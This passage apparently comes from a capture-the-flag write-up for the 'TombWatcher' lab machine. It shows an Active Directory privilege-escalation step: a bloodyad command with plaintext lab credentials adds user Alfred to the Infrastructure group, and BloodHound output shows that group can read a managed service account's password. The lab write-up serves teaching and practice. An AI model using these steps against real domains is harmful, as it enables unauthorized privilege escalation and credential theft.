- back to bloodhound

- Alfred has `AddSelf` permissions over the group `Infrastructure`, lets add him to that group using `bloodyad`
```python
bloodyad --host dc01.tombwatcher.htb \
  -d tombwatcher.htb \
  -u Alfred \
  -p 'basketball' \
  add groupMember 'INFRASTRUCTURE' 'Alfred'
```
- Alfred was successfully added to that group!
- Going back to bloodhound, we observe that the group `Infrastructure` has `GMSAPassword` permissions over the `Group managed service account` `ANSIBLE_DEV$@TOMBWATCHER.HTB`
